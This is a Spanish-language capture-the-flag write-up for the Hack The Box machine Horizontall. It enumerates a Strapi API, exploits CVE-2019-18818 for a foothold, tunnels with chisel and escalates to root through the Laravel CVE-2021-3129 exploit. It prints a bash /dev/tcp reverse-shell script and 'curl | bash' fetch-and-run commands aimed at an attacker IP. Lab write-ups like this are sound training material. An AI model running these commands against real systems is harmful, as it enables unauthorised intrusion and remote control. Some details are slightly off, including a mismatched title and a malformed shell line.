# Validation

<p align="center">
  <img src="https://www.hackthebox.com/storage/avatars/e4ec7d8504fdb58b5e6b7ddc82aafc77.png">
</p>

<div align="center">
  <table>
    <tr>
      <th>Plataforma</th>
      <th>Nombre</th>
      <th>OS</th>
      <th>IP</th>
      <th>Fecha de la máquina retirada</th>
      <th>Dificultad</th>
      <th>Certificaciones</th>
      <th>Status</th>
    </tr>
    <tr>
      <td>Hack The Box</td>
      <td>Horizontall</td>
      <td>Linux</td>
      <td>10.10.11.105</td>
      <td>28 de Agosto 2021</td>
      <td>:green_circle: Fácil</td>
      <td>
        <ul>
          <li>eJPT</li>
          <li>eWPT</li>
        </ul>
      </td>
      <td align="center">:heavy_check_mark:</td>
    </tr>
  </table>
</div>

> -------------------------

## Etapas

- [Etapa de Reconocimiento](#etapa-de-reconocimiento)
- [Etapa de Enumeración](#etapa-de-enumeración)
- [Etapa de Explotación](#etapa-de-explotación)
- [Etapa de Escalada de Privilegios](#etapa-de-escalada-de-privilegios)

> -------------------------

## Técnicas Exploradas

- Information Leakage
- Port Forwarding
- Strapi CMS Exploitation
- Laravel Exploitation

> -------------------------

## Etapa de Reconocimiento

<p align="justify">
  Para empezar, iniciamos un escaneo agresivo para la enumeración de puerto abierto y descubrimos la siguiente información de puertos, lo cual no es recomendable, se debe aplicar escaneos sigiloso.
</p>

```python
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP> -oG allPorts
nmap -sCV -p<PORTS> <IP> -oN targeted
```
|Item|Descripción|
|---|---|
|-p-|Un atajo que le dice a Nmap que escanee todos los puertos|
|-vvv|Brinda una salida muy detallada para que pueda ver los resultados a medida que se encuentran, y también incluye información que normalmente no se muestra|
|-sC|Equivale --script=default ejecuta una colección de scripts de enumeración Nmap contra el objetivo|
|-sV|¿Escanea una versión de servicio?|
|-oA|Guarda los tres formatos (estándar, greppable y XML) de salida con un nombre de archivo de $name|

```php

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee774143d482bd3e6e6e50cdff6b0dd5 (RSA)
|   256 3ad589d5da9559d9df016837cad510b0 (ECDSA)
|_  256 4a0004b49d29e7af37161b4f802d9894 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

> -------------------------

## Etapa de Enumeración

<p align="justify">
  Comencemos enumerando el puerto 80 en primer lugar. La página de inicio se presenta de la siguiente manera. Al examinar el código fuente de la página, no se encontró información útil.
</p>

>**SERVICIO HTTP - PORT 80**

<p align="justify">
  Cuando se intenta acceder a la dirección IP en mi navegador, fui redirigido al dominio horizontall.htb. No obstante, debido a que este nombre de dominio no se resolvía a través de DNS, se generó un error de redireccionamiento.
</p>

```go
whatweb http://10.10.11.105/
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/8c45ebd5-936d-4fa5-991c-c62e84e5e52d">
</p>

<p align="justify">
  Para resolver este problema, incluir la dirección IP y el nombre de dominio del servidor en el archivo /etc/hosts de mi sistema. Como resultado, al visitar el nombre de dominio, la aplicación se cargó correctamente. 
</p>

```java
 # Virtual Hosting
 10.10.11.105  horizontall.htb
```

<p align="justify">
  Luego, procedí a ejecutar WhatWeb, pero no proporcionó información adicional sobre la aplicación que no se hubiera revelado previamente mediante Nmap. WhatWeb confirmó que el servidor estaba utilizando Ubuntu y que el servidor web era nginx.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/627ae105-554c-4a8c-ac46-beadc239e84f">
</p>

<p align="justify">
  Al examinar el código fuente, se puede observar la presencia de archivos JavaScript. Esto nos brinda la oportunidad de buscar información adicional que podría revelar un vector de ataque que nos ayuden a resolver el problema de la máquina. Observé una función llamada "getReviews" que hacía referencia al subdominio "api-prod".
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/91d59100-3b15-4843-9f14-abf46a16789e">
</p>

>**Enumeración API Virtual Host**

```go
vi /etc/hosts

# Virtual Hosting
10.10.11.105  horizontall.htb api-prod.horizontall.htb
```
<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/468bd55d-021a-4568-90ad-05e5de79f080">
</p>

<p align="justify">
  Luego de añadir el nuevo host virtual a mi archivo de hosts, accedí a él en mi navegador. No había mucho contenido visible, aparte de un mensaje de bienvenida. Pero identificamos que tiene un gestor de contenido.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/01765daa-73d4-4836-a47f-760e9a66de0b">
</p>

<p align="justify">
  Además de revisar el código fuente, decidimos realizar una nueva enumeración con Gobuster, y esta vez obtuvimos resultados al descubrir algunos directorios.
</p>

- [SecList - WordLists](https://github.com/danielmiessler/SecLists)

```go
❯ wfuzz -c --hc=404 --hh=854 -t 200 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://api-prod.horizontall.htb/FUZZ"
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/7ac25e0f-33bb-4eed-aa04-098f16fdc1f0">
</p>

<p align="justify">
  Siguiendo la indicación del comentario, revisamos los archivos JavaScript, específicamente el archivo mencionado. Encontramos algo de interés: la versión de Strapi utilizada en el portal.
</p>

```go
wfuzz -c --hc=404 --hh=854 -t 200 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://api-prod.horizontall.htb/admin/FUZZ"
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/c1bf3392-c974-4c05-9b18-5d1ad40269b5">
</p>

<p align="justify">
  Por lo tanto, procedí a acceder al endpoint /admin/init para obtener la versión del servicio y evaluar si presentaba vulnerabilidades. La API proporcionó información que indicaba que se trataba de la versión 3.0.0-beta.17.4, lo que sugiere que podría ser el caso.
</p>

```go

curl -s -X GET "http://api-prod.horizontall.htb/admin/init" | jq

```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/1baf1f95-18dc-4a25-bfa7-bd9aa9b00ac6">
</p>

> -------------------------

## Etapa de Explotación

<p align="justify">
  Después de identificar la tecnología utilizada, procedí a buscar exploits en Exploit Database y encontré uno relacionado con la Ejecución Remota de Código (RCE). En resumen, este exploit permite realizar un restablecimiento de contraseña. Está escrito en Python y se aprovecha de la vulnerabilidad designada como CVE-2019-18818.
</p>

```go
searchsploit strapi 3.0.0
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/1c89814e-89d6-486d-b481-4604aeb0a927">
</p>

```go
searchsploit -m miltiple/webapps/50239.py
```

<p align="justify">
  Descargamos el exploit para poder realizar las pruebas de exploitación.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/0cf47b3a-9aa7-4294-98ee-44771bd0a227">
</p>

<p align="justify">
  Antes de intentar las vulnerabilidades mencionadas, probamos la conexión utilizando Netcat y confirmamos que la conexión es exitosa. Sin embargo, no tenemos acceso a una terminal completa en esta instancia.
</p>

```go
python exploit_strapi.py "http://api-prod.horizontall.htb/"
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/d42545aa-5c4d-4734-a25c-23f35b4def69">
</p>

<p align="justify">
  Para superar esta limitación, realizamos una búsqueda en el siguiente enlace y encontramos una técnica para obtener una shell inversa utilizando Netcat adjuntando instrucciones en un archivo index.html que estaremos hosteando desde la máquina victima.
</p>

- [Reverse Shell - Tool](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```bash
#!/bin/bash

bash -c "bash -i /dev/tcp/10.10.14.2/443 0>&1"
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/ec11fcba-51c4-4107-9d9a-ca4a9a25d739">
</p>

<p align="justify">
  Ahora nos podemos a hostear un servidor HTTP con Python.
</p>

```go
python3 -m http.server 80
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/2fb5426e-d2ff-4753-a16c-40dd303ba41a">
</p>

<p align="justify">
  Para ejecutar el script, podemos utilizar la siguiente sintaxis, seguida de una tubería (pipe) y el comando "bash" para ejecutar el script y obtener acceso a una consola interactiva.
</p>

```go
curl http://10.10.14.2/ | bash
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/8c462e52-d6b1-402c-ac93-76f6659654ea">
</p>

```go
nc -nvlp 443
```

<p align="justify">
  Hemos logrado obtener acceso y, para mejorar la interacción, hemos configurado una TTY para obtener una terminal interactiva completa.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/21713332-fd70-4dab-9a36-1b51b88e3de5">
</p>

>**TRATAMIENTO DE LA TTY**

```go
$ script /dev/null -c bash
^Z
# stty raw -echo; fg
reset xterm

$ export TERM=xterm
$ export SHELL=bash
$ stty rows ## columns ###
```

<p align="justify">
  Ahora que hemos conseguido acceso, revisamos la lista de usuarios existentes y recuperamos la bandera de usuario en el directorio home del usuario "developer".
</p>

```go
cd /home/developer
cat user.txt
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/99abeb14-31fe-4315-aed3-e5a24e06846d">
</p>

> -------------------------

## Etapa de Escalada de Privilegios

<p align="justify">
  Ahora que hemos obtenido la bandera del usuario, procedemos a realizar una enumeración del sistema para identificar posibles oportunidades de escalar privilegios. Durante esta revisión, exploramos los archivos con permisos, conexiones, tareas en ejecución y otros aspectos del sistema. Durante este proceso, encontramos algo de interés al analizar los puertos abiertos en la máquina.
</p>

```go
find / \-perm -4000 -user root 2>/dev/null
getcap -r / 2>/dev/null
crontab -e
cat /etc/crontab
ps -faux
netstat -nat
nestat -putona
```

<p align="justify">
Nos llamó la atención específicamente el puerto 8000, y dado que no teníamos información sobre su propósito, decidimos hacer una solicitud con "curl" para explorar su contenido. Descubrimos que se trataba de un portal basado en Laravel y pudimos identificar la versión exacta de la aplicación.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/414724bd-a043-46ab-8b9b-c2c83240113b">
</p>

```go
curl http://localhost:8000
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/2ff91230-b7ce-446d-8610-79bfdbd5ae36">
</p>

<p align="justify">
  Decidimos realizar otra búsqueda en Google y descubrimos una vulnerabilidad conocida como CVE-2021-3129. Además, encontramos varios exploits disponibles para esta vulnerabilidad, y optamos por utilizar uno de los disponibles en GitHub.
</p>

<p align="justify">
  Para añadir un elemento de interés adicional, podemos utilizar un "Remote Port Forwarding" que nos permitirá exponer el puerto 8000 de la máquina víctima con chisel, que de otro modo no estaría accesible, ya que esta siendo ejecutado de forma interna. Esto nos proporcionará una oportunidad para abusar de la situación y potencialmente escalar privilegios.
</p>

- [Chisel](https://github.com/jpillora/chisel)

```go
git clone https://github.com/jpillora/chisel
cd chisel
go build -ldflags "-s -w" .
upx chisel -> Reducimos el peso del binario
```

<p align="justify">
  Para transferir el binario, podemos configurar un servidor HTTP utilizando Python y luego descargar el archivo en la máquina víctima.
</p>

```go
VM ATACANTE>
	python3 -m http.server 80
VM VICTIMA>
	wget http://10.10.14.2/chisel
```

>**CHISEL**

- **VM VÍCTIMA**

```go
./chisel client 10.10.14.2:1234 R:8000:localhost:8000
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/45e7a5c4-e877-422a-8324-c56b24c94253">
</p>

- **VM ATACANTE**

```go
./chisel server --reverse -p 1234
```
<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/ae38c6ab-6194-4fdd-8e0b-b943d4ab46ed">
</p>

<p align="justify">
  Ejecuté el exploit utilizando la siguiente sintaxis y los resultados indicaron que Laravel se estaba ejecutando con privilegios de root.
</p>

- [Exploit - Laravel V8](https://github.com/nth347/CVE-2021-3129_exploit)

```go
git clone https://github.com/nth347/CVE-2021-3129_exploit.git
cd CVE-2021-3129_exploit
python3 exploit.py http://localhost:8000 Monolog/RCE1 "ifconfig && whoami"
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/c5a77033-26b0-4a70-a20b-b1616bfca2d0">
</p>

<p align="justify">
  Validamos que tenemos RCE, podemos entablar una conexión reversa.
</p>

- [Reverse Shell - Tool](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```go
python3 exploit.py http://localhost:8000 Monolog/RCE1 "curl http://10.10.14.2 | bash"
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/4b1c33c0-187b-407d-95bb-20cca1457170">
</p>

<p align="justify">
  Ahora que hemos obtenido privilegios de superusuario (root), solo nos queda obtener la flag del usuario ROOT. Para ello, ejecutamos los comandos necesarios.
</p>

```go
cd /root/
ls -la
cat root.txt
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/d1d32b26-955a-4cae-ac4f-fe16dc82af1a">
</p>

>**HORINZONTALL - PWNED!**
